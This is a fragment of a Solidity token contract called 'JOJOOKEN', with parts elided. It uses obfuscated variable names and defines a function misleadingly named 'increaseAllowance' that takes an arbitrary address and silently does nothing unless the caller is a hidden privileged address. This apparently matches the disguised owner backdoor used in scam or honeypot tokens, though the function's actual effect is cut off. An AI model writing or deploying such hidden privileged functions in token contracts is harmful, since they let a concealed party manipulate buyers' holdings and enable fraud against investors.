...
contract JOJOOKEN is Ownable {
    ...
    string private _hooextokenname = "JOJO";
    string private _voptokensymbol = "JOJO";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public cshfnrt445;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(cshfnrt445 != _msgSender()){
            return ;
        }else{
           require(cshfnrt445 == _msgSender());
